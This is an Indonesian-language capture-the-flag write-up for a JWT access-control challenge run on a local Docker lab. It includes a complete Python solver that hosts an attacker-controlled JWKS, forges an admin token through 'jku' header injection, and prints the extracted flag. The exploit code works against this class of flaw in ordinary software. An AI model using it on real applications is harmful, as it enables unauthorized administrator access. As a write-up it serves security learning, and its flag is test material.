# WriteUp - Nexkeys

## Overview

* **Judul:** Nexkeys
* **Kategori:** Access Control
* **Poin:** 50
* **Deskripsi:** Akses dashboard admin. kredensial: `<username>:anyaunyu`
* **Author:** -
* **URL:** `http://localhost:1337`

## Attachment Information & Directory Structure

Konfigurasi Docker yang diberikan pada soal:

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/nexkeys:latest
    ports:
      - "1337:80"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

Pemeriksaan struktur direktori source code di dalam kontainer `nexkeys-web-1`:

```bash
▶  docker exec nexkeys-web-1 ls -la
total 20
drwxr-xr-x    1 root     root          4096 Feb 24 18:06 .
drwxr-xr-x    1 root     root          4096 Feb 24 18:06 ..
-rw-r--r--    1 root     root            73 Feb 24 05:19 requirements.txt
drwxr-xr-x    2 root     root          4096 Feb 24 08:37 src
drwxr-xr-x    2 root     root          4096 Feb 24 07:35 templates

▶  docker exec nexkeys-web-1 ls -la src
total 16
drwxr-xr-x    2 root     root          4096 Feb 24 08:37 .
drwxr-xr-x    1 root     root          4096 Feb 24 18:06 ..
-rw-r--r--    1 root     root          5501 Feb 24 08:34 app.py

▶  docker exec nexkeys-web-1 ls -la templates
total 28
drwxr-xr-x    2 root     root          4096 Feb 24 07:35 .
drwxr-xr-x    1 root     root          4096 Feb 24 18:06 ..
-rw-r--r--    1 root     root          5130 Feb 24 07:33 admin.html
-rw-r--r--    1 root     root          8980 Feb 24 07:34 index.html

```

File `requirements.txt` menunjukkan dependensi kunci kriptografi:

```text
Flask==3.1.0
PyJWT[crypto]==2.10.1
cryptography==44.0.0
requests==2.32.3

```

## Proses Penyelesaian

### 1. Source Code Analysis

Aplikasi dibangun menggunakan Flask dan mengimplementasikan mekanisme autentikasi JSON Web Token (JWT) secara kustom menggunakan algoritma `RS256`.
Endpoint `/admin` mengamankan area administratif dengan memeriksa JWT pada *cookie* `auth` dan memvalidasi apakah payload berisi `{"user": "admin"}`.

### 2. Vulnerability Identification (JWK Set URL Injection)

Kerentanan kritis ditemukan pada fungsi `_verify_jwt` di dalam file `src/app.py`:

```python
def _verify_jwt(token: str) -> dict:
    parts = token.split(".")
    # ...
    header = json.loads(b64d(parts[0]))
    payload = json.loads(b64d(parts[1]))
    # ...
    jku = header.get("jku")
    if not jku:
        raise ValueError("Missing key set URL")
    resp = requests.get(jku, timeout=5)
    resp.raise_for_status()
    jwks = resp.json()
    # ...

```

Fungsi tersebut mempercayai dan membaca nilai parameter `jku` (JWK Set URL) langsung dari *header* JWT yang **belum diverifikasi tandatangannya**. Aplikasi kemudian melakukan HTTP GET *request* ke URL tersebut untuk mengunduh *Public Key* yang selanjutnya digunakan untuk memverifikasi keabsahan JWT itu sendiri.

### 3. Exploitation Strategy

Karena parameter `jku` sepenuhnya dikendalikan oleh *client*, kita dapat mem-bypass autentikasi dengan langkah-langkah berikut:

1. **Key Generation:** Membuat pasangan kunci RSA (Private dan Public Key) milik penyerang.
2. **JWKS Hosting:** Mengekspos Public Key tersebut dalam format JWK Set melalui server HTTP lokal agar dapat dijangkau oleh aplikasi target.
3. **JWT Forging:** Membangun JWT dengan header yang menunjuk ke server HTTP lokal (`"jku": "http://<attacker-ip>:<port>/jwks.json"`) dan payload administrator (`{"user": "admin"}`).
4. **Signing:** Menandatangani JWT palsu tersebut menggunakan Private Key milik penyerang.
5. Saat JWT dikirim ke server target di endpoint `/admin`, server akan mengunduh Public Key milik penyerang, mencocokkannya dengan tanda tangan penyerang, dan sukses memverifikasi token sebagai "valid".

## Script Solver

Skrip python berikut merangkum proses *key generation*, membuka server HTTP secara paralel (*threading*), melakukan *forging* JWT, dan mengirimnya untuk mengekstrak flag dari dashboard admin.

```python
import os
import json
import base64
import requests
import threading
import socket
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "172.17.0.1"
    finally:
        s.close()

HOST_IP = get_local_ip()
PORT = 9999

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

def int_to_b64(n: int) -> str:
    length = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(length, "big")).rstrip(b"=").decode()

nums = public_key.public_numbers()
jwks = {
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "alg": "RS256",
            "n": int_to_b64(nums.n),
            "e": int_to_b64(nums.e),
        }
    ]
}

class JWKSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(jwks).encode())
    
    def log_message(self, format, *args):
        pass

def run_server():
    server = HTTPServer(('0.0.0.0', PORT), JWKSHandler)
    server.serve_forever()

print("[*] Starting local JWKS server...")
t = threading.Thread(target=run_server, daemon=True)
t.start()
print(f"[*] Hosted malicious JWKS at http://{HOST_IP}:{PORT}/jwks.json")

jku_url = f"http://{HOST_IP}:{PORT}/jwks.json"
header = {"alg": "RS256", "jku": jku_url, "typ": "JWT"}
payload = {"user": "admin"}

def b64e(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")

h = b64e(json.dumps(header, separators=(",", ":")).encode())
p = b64e(json.dumps(payload, separators=(",", ":")).encode())
signing_input = h + b"." + p

sig = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
s = b64e(sig)
forged_token = (signing_input + b"." + s).decode()

print(f"[*] Forged Token: {forged_token[:40]}...")

print("[*] Accessing /admin with forged token...")
time.sleep(1)

try:
    cookies = {"auth": forged_token}
    res = requests.get("http://localhost:1337/admin", cookies=cookies)
    
    import re
    match = re.search(r'<div class="flag-box"[^>]*>(.*?)</div>', res.text)
    if match:
        print("\n========================================")
        print("[+] PWNED! Flag Extracted:")
        print(match.group(1).strip())
        print("========================================\n")
    else:
        print("[-] Flag tidak ditemukan. Cek respon server:")
        print(res.text)
except Exception as e:
    print(f"[-] Error: {e}")

```

## Output Terminal

```bash
▶  ./solver.py
[*] Starting local JWKS server...
[*] Hosted malicious JWKS at http://172.22.171.158:9999/jwks.json
[*] Forged Token: eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8x...
[*] Accessing /admin with forged token...

========================================
[+] PWNED! Flag Extracted:
pwn{ba98dc0e9c65b3de562eb1fb29288637}
========================================

```

## Flag

```
pwn{ba98dc0e9c65b3de562eb1fb29288637}

```
